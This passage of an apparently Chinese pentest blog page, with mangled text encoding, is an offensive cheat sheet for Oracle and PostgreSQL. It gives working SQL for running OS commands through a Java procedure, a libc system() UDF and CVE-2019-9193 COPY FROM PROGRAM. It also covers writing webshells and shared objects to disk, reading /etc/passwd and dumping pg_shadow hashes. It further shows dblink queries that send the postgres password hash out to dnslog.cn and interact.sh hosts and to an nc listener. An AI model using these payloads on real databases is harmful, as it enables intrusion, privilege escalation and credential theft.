&#125;</span><br><span class="line">        proc.destroy();</span><br><span class="line">        inp_suc.close();</span><br><span class="line">        inp_err.close();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;EXECUTE IS ERROR!&quot;</span>);</span><br><span class="line">      System.out.println(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* public static void main(String[] args)&#123;</span></span><br><span class="line"><span class="comment">      list_cmd(args[0]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ›å»ºå­˜å‚¨è¿‡ç¨‹</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create or replace procedure p_exe_linux(str varchar2) as language java</span><br><span class="line">name &#39;Test.list_cmd(java.lang.String)&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET SERVEROUTPUT ON</span><br><span class="line">exec dbms_java.set_output(1111111111111);</span><br><span class="line">EXEC P_EXE_LINUX(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure>

<br/>

<hr>
<br/>

<h2 id="Other-2"><a href="#Other-2" class="headerlink" title="Other"></a>Other</h2><h3 id="è¿æ¥IP-2"><a href="#è¿æ¥IP-2" class="headerlink" title="è¿æ¥IP"></a>è¿æ¥IP</h3><blockquote>
<p>åœ¨Oracleä¸­ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤åˆ—å‡ºè¿æ¥ä¿¡æ¯ã€‚</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">sid</span>, <span class="built_in">serial</span><span class="comment">#, username, osuser, machine, program, status, logon_time</span></span><br><span class="line"><span class="keyword">FROM</span> v$<span class="keyword">session</span></span><br><span class="line"><span class="keyword">WHERE</span> audsid != userenv(<span class="string">&#x27;SESSIONID&#x27;</span>)</span><br><span class="line"><span class="keyword">AND</span> <span class="keyword">type</span>=<span class="string">&#x27;USER&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> service_name=<span class="string">&#x27;&lt;database_name&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è¯»å–æœåŠ¡ç«¯æ–‡ä»¶"><a href="#è¯»å–æœåŠ¡ç«¯æ–‡ä»¶" class="headerlink" title="è¯»å–æœåŠ¡ç«¯æ–‡ä»¶"></a>è¯»å–æœåŠ¡ç«¯æ–‡ä»¶</h3><ul>
<li>Utl_file</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> <span class="keyword">replace</span> <span class="keyword">directory</span> user_dir <span class="keyword">as</span> <span class="string">&#x27;C:\TEMP\oracle_dir&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">read</span> <span class="keyword">on</span> <span class="keyword">directory</span> user_dir <span class="keyword">to</span> <span class="keyword">public</span>;</span><br><span class="line"><span class="keyword">grant</span> write <span class="keyword">on</span> <span class="keyword">directory</span> user_dir <span class="keyword">to</span> <span class="keyword">public</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> dba_directories;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">F1 utl_file.file_type;</span><br><span class="line">V1 varchar2(32767);</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">F1:=utl_file.fopen(<span class="string">&#x27;USER_DIR&#x27;</span>,<span class="string">&#x27;02.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">utl_file.get_line(F1,V1,30);</span><br><span class="line">utl_file.fclose(F1);</span><br><span class="line">dbms_output.put_line(V1);</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>



<br/>

<hr>
<hr>
<br/>



<h1 id="POSTGRESQL"><a href="#POSTGRESQL" class="headerlink" title="POSTGRESQL"></a>POSTGRESQL</h1><br/>



<h2 id="PostgreSQL-GetShell"><a href="#PostgreSQL-GetShell" class="headerlink" title="PostgreSQL GetShell"></a>PostgreSQL GetShell</h2><br/>



<h3 id="ä¿¡æ¯è·å–"><a href="#ä¿¡æ¯è·å–" class="headerlink" title="ä¿¡æ¯è·å–"></a>ä¿¡æ¯è·å–</h3><ul>
<li>ç‰ˆæœ¬ä¿¡æ¯</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">show</span> server_version;</span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;PG_VERSION&#x27;</span>, <span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æ•°å­—ç‰ˆæœ¬ä¿¡æ¯åŒ…æ‹¬å°ç‰ˆå·</span></span><br><span class="line"><span class="keyword">SHOW</span> server_version_num;</span><br><span class="line"><span class="keyword">SELECT</span> current_setting(<span class="string">&#x27;server_version_num&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ—ä¸¾ç›®å½•</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ³¨æ„: åœ¨æ—©æœŸçš„ PostgreSQL ç‰ˆæœ¬ä¸­,pg_ls_dir ä¸å…è®¸ä½¿ç”¨ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;/etc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å– pgsql å®‰è£…ç›®å½•</span></span><br><span class="line"><span class="keyword">select</span> setting <span class="keyword">from</span> pg_settings <span class="keyword">where</span> <span class="type">name</span> = <span class="string">&#x27;data_directory&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥æ‰¾ pgsql é…ç½®æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="keyword">select</span> setting <span class="keyword">from</span> pg_settings <span class="keyword">where</span> <span class="type">name</span>=<span class="string">&#x27;config_file&#x27;</span></span><br></pre></td></tr></table></figure>





<br/>



<h3 id="Copy-To-å†™å…¥Shell"><a href="#Copy-To-å†™å…¥Shell" class="headerlink" title="Copy To å†™å…¥Shell"></a>Copy To å†™å…¥Shell</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code></li>
<li>æœ‰Webç›®å½•çš„<code>å†™å…¥</code>æƒé™</li>
</ul>
<blockquote>
<p>Copy To file</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span>  (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># base64ç¼–ç </span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">select</span> convert_from(decode(<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOyA/Pg==&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="LO-CREATEå†™å…¥Shell"><a href="#LO-CREATEå†™å…¥Shell" class="headerlink" title="LO_CREATEå†™å…¥Shell"></a>LO_CREATEå†™å…¥Shell</h3><blockquote>
<p>åˆ©ç”¨åˆ†ç‰‡è¿›è¡Œä¸Šä¼ ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª OID ä½œä¸ºå†™å…¥çš„å¯¹è±¡, ç„¶åé€šè¿‡ 0,1,2,3â€¦ åˆ†ç‰‡ä¸Šä¼ ä½†æ˜¯å¯¹è±¡éƒ½ä¸º 12345 æœ€åå¯¼å‡ºåˆ° / tmp ç›®å½•ä¸‹, æ”¶å°¾åˆ é™¤ OID</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, decode(<span class="string">&#x27;7f454c4...0000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, decode(<span class="string">&#x27;0000000...0000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, decode(<span class="string">&#x27;f604000...0000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, decode(<span class="string">&#x27;0000000...7400&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">&#x27;/tmp/test.so&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="LO-EXPORTå†™å…¥Shell"><a href="#LO-EXPORTå†™å…¥Shell" class="headerlink" title="LO_EXPORTå†™å…¥Shell"></a>LO_EXPORTå†™å…¥Shell</h3><blockquote>
<p>lo_export é‡‡ç”¨å¤§å¯¹è±¡ OID å’Œè·¯å¾„ï¼Œå°†æ–‡ä»¶å†™å…¥è·¯å¾„ã€‚</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">12349</span>,<span class="string">&#x27;ffffffff0x&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12349</span>, <span class="string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- base64 çš„å½¢å¼</span></span><br><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">12350</span>,decode(<span class="string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>));</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12350</span>, <span class="string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="lo-export-pg-largeobject"><a href="#lo-export-pg-largeobject" class="headerlink" title="lo_export + pg_largeobject"></a>lo_export + pg_largeobject</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- è®°ä¸‹ç”Ÿæˆçš„lo_creat ID</span></span><br><span class="line"><span class="keyword">select</span> lo_creat(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æ›¿æ¢ &lt;ID&gt; ä¸ºç”Ÿæˆçš„lo_creat ID</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject(loid, pageno, data) <span class="keyword">values</span> (&lt;ID&gt;, <span class="number">0</span>, decode(<span class="string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> lo_export(&lt;ID&gt;, <span class="string">&#x27;/tmp/success.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å¦‚æœå†™å…¥å†…å®¹è¿‡å¤šï¼Œå°±é¦–å…ˆåˆ›å»ºä¸€ä¸ªOIDä½œä¸ºå†™å…¥çš„å¯¹è±¡ï¼Œç„¶åé€šè¿‡ 0,1,2,3â€¦ åˆ†ç‰‡ä¸Šä¼ ä½†æ˜¯å¯¹è±¡éƒ½ä¸º 12345 æœ€åå¯¼å‡ºåˆ° /tmp ç›®å½•ä¸‹, æ”¶å°¾åˆ é™¤ OID</p>
<p><code>å†™çš„æ–‡ä»¶æ¯ä¸€é¡µä¸èƒ½è¶…è¿‡2KB</code></p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, decode(<span class="string">&#x27;6666&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, decode(<span class="string">&#x27;666666&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, decode(<span class="string">&#x27;6666&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, decode(<span class="string">&#x27;663078&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>ä¹Ÿå¯ä»¥ç”¨lo_putåœ¨åé¢è¿›è¡Œæ‹¼æ¥å†™å…¥</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_create(<span class="number">11116</span>);</span><br><span class="line"><span class="keyword">select</span> lo_put(<span class="number">11116</span>,<span class="number">0</span>,<span class="string">&#x27;dGVzdDEyM&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> lo_put(<span class="number">11116</span>,<span class="number">9</span>,<span class="string">&#x27;zQ1Ng==&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> lo_from_bytea(<span class="number">11141</span>,decode(encode(lo_get(<span class="number">11116</span>),<span class="string">&#x27;escape&#x27;</span>),<span class="string">&#x27;base64&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> lo_export(<span class="number">11141</span>,<span class="string">&#x27;/tmp/test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">11141</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ¸…ç†<span class="type">OID</span>å†…å®¹</span><br><span class="line"><span class="comment">-- æŸ¥çœ‹åˆ›å»ºçš„ lo_creat ID</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pg_largeobject</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ä½¿ç”¨ lo_unlink è¿›è¡Œåˆ é™¤</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br></pre></td></tr></table></figure>



<br/>

<hr>
<br/>

<h2 id="PostgreSQLææƒ"><a href="#PostgreSQLææƒ" class="headerlink" title="PostgreSQLææƒ"></a>PostgreSQLææƒ</h2><br/>



<h3 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h3><blockquote>
<p>udfè°ƒç”¨æœ¬åœ°soæ–‡ä»¶,æˆ–è€…è‡ªå·±ä¸Šä¼ soå‘½ä»¤æ‰§è¡Œ.</p>
<p>ä¸€èˆ¬<code>8.2ä»¥ä¸‹</code>çš„ç‰ˆæœ¬ postgresql ä¸éªŒè¯ magic block,å¯ä»¥ç›´æ¥è°ƒç”¨æœ¬åœ°çš„ libc.so</p>
<p><code>8.2 ä»¥ä¸Š</code>ç‰ˆæœ¬,éœ€è¦è‡ªå·±ç¼–è¯‘ so æ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥ç”¨mysqlçš„<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql">soæ–‡ä»¶</a></p>
<p>å…·ä½“è¯¦è§<a target="_blank" rel="noopener" href="https://github.com/No-Github/postgresql_udf_help">postgresql_udf_help</a></p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR REPLACE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(<span class="type">cstring</span>) <span class="keyword">RETURNS</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> <span class="string">&#x27;c&#x27;</span> <span class="keyword">STRICT</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="PL-Python-æ‰©å±•"><a href="#PL-Python-æ‰©å±•" class="headerlink" title="PL/Python æ‰©å±•"></a>PL/Python æ‰©å±•</h3><br/>



<h3 id="CVE-2018-1058"><a href="#CVE-2018-1058" class="headerlink" title="CVE-2018-1058"></a>CVE-2018-1058</h3><blockquote>
<p>PostgreSQL å…¶ 9.3 åˆ° 10 ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªé€»è¾‘é”™è¯¯ï¼Œå¯¼è‡´è¶…çº§ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è§¦å‘æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ¶æ„ä»£ç ï¼Œå¯¼è‡´æ‰§è¡Œä¸€äº›ä¸å¯é¢„æœŸçš„æ“ä½œã€‚</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">CVE-2018-1058</a></li>
</ul>
<br/>



<h3 id="CVE-2019-9193"><a href="#CVE-2019-9193" class="headerlink" title="CVE-2019-9193"></a>CVE-2019-9193</h3><blockquote>
<p>PostgreSQL å…¶ 9.3 åˆ° 11 ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„â€œç‰¹æ€§â€ï¼Œç®¡ç†å‘˜æˆ–å…·æœ‰â€œCOPY TO/FROM PROGRAMâ€æƒé™çš„ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>å‰ææ¡ä»¶ï¼š</p>
<ul>
<li>ç‰ˆæœ¬9.3-11.2</li>
<li>è¶…çº§ç”¨æˆ·æˆ–è€…pg_read_server_filesç»„ä¸­çš„ä»»ä½•ç”¨æˆ·</li>
</ul>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output <span class="type">text</span>);</span><br><span class="line"><span class="keyword">COPY</span> cmd_exec <span class="keyword">FROM PROGRAM</span> <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure>



<br/>

<hr>
<br/>

<h2 id="Other-3"><a href="#Other-3" class="headerlink" title="Other"></a>Other</h2><blockquote>
<p>æŸ¥è¯¢å¯†ç </p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> usename, passwd <span class="keyword">FROM</span> pg_shadow;</span><br></pre></td></tr></table></figure>

<h3 id="Pgè¯»å–æ–‡ä»¶"><a href="#Pgè¯»å–æ–‡ä»¶" class="headerlink" title="Pgè¯»å–æ–‡ä»¶"></a>Pgè¯»å–æ–‡ä»¶</h3><ul>
<li>pg_read_file</li>
</ul>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> testaaaa;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> testaaaa(t <span class="type">TEXT</span>);</span><br><span class="line"><span class="keyword">copy</span> testaaaa <span class="keyword">from</span> <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> testaaaa <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>lo_import</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">select</span> array_agg(b)::<span class="type">text</span>::<span class="type">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> encode(data,<span class="string">&#x27;hex&#x27;</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid=<span class="number">12345678</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å•å¼•å·è¢«è½¬ä¹‰çš„æƒ…å†µä¸‹ä½¿ç”¨</span></span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>lo_import($$<span class="ruby">/etc/passwd$$</span>,<span class="number">11111</span>);</span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>cast(encode(data,$$<span class="ruby">base64$$</span>)<span class="keyword">as</span><span class="comment">/**/</span><span class="type">integer</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>pg_largeobject<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>loid=<span class="number">11111</span></span><br></pre></td></tr></table></figure>

<ul>
<li>copy_from</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> testf0x(t <span class="type">TEXT</span>);</span><br><span class="line"><span class="keyword">copy</span> testf0x <span class="keyword">from</span> <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> testf0x <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<h3 id="PGå¤–å¸¦æ•°æ®"><a href="#PGå¤–å¸¦æ•°æ®" class="headerlink" title="PGå¤–å¸¦æ•°æ®"></a>PGå¤–å¸¦æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- å¼€å¯ dblink æ‰©å±•</span></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION dblink</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·åç§°</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dblink(<span class="string">&#x27;host=&#x27;</span>||(<span class="keyword">select</span> <span class="keyword">user</span>)||<span class="string">&#x27;.djw0pg.dnslog.cn user=test dbname=test&#x27;</span>, <span class="string">&#x27;SELECT version()&#x27;</span>) <span class="keyword">RETURNS</span> (<span class="keyword">result</span> <span class="built_in">TEXT</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>å¤–å¸¦å¯†ç </li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dblink(<span class="string">&#x27;host=&#x27;</span>||(<span class="keyword">SELECT</span> passwd <span class="keyword">FROM</span> pg_shadow <span class="keyword">WHERE</span> usename=<span class="string">&#x27;postgres&#x27;</span>)||<span class="string">&#x27;.c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh user=test dbname=test&#x27;</span>, <span class="string">&#x27;SELECT version()&#x27;</span>) <span class="keyword">RETURNS</span> (result <span class="type">TEXT</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>NCè·å–</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- nc ç›‘å¬</span><br><span class="line">nc -lvv <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">select dblink<span class="constructor">_connect((<span class="params">select</span> &#x27;<span class="params">hostaddr</span>=<span class="params">x</span>.<span class="params">x</span>.<span class="params">x</span>.<span class="params">x</span> <span class="params">port</span>=4445 <span class="params">user</span>=<span class="params">test</span> <span class="params">password</span>=<span class="params">test</span> <span class="params">sslmode</span>=<span class="params">disable</span> <span class="params">dbname</span>=&#x27;<span class="operator">||</span>(SELECT <span class="params">passwd</span> FROM <span class="params">pg_shadow</span> WHERE <span class="params">usename</span>=&#x27;<span class="params">postgres</span>&#x27;)</span>));</span><br></pre></td></tr></table></figure>



<h3 id="åˆ—ä¸¾ç›®å½•"><a href="#åˆ—ä¸¾ç›®å½•" class="headerlink" title="åˆ—ä¸¾ç›®å½•"></a>åˆ—ä¸¾ç›®å½•</h3><blockquote>
<p>åˆ—ç›®å½•</p>
</blockquote>
